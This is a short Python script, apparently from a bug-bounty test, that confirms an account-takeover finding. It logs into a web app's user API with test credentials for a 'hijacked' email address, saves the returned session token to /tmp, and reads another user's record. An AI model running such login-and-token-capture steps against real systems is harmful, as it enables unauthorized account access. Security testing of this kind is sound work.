import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
print("=== can we log in as the hijacked identity? ===")
for label,email,pw in [
  ("hijacked addr + known pw","zeno0@bugcrowdninja.com","TesterZx2026!"),
  ("hijacked addr + Tester","zeno0@bugcrowdninja.com","Tester"),
  ("OLD addr + known pw","golden-leaf-3068@bugcrowdninja.com","TesterZx2026!"),
]:
    c,b=login(email,pw)
    line=f"  {label:28} -> {c}"
    if c=='200':
        s=json.loads(b)['session']
        line+=f"  *** id={s['id']} role={s['role_id']} email={s['email']} ***"
        open('/tmp/tok_hijacked','w').write(s['token'])
    print(line)
print()
print("=== current record for 230 ===")
TT=open('/tmp/tok_Tester').read().strip()
cmd=['curl','-s','-m','30',H+'/api/v1/users/230','-H','token: '+TT,'-H',BB]
u=json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)['users'][0]
print(f"  id={u['id']} email={u['email']!r} role={u['role_id']} auth={u['auth_type']}")
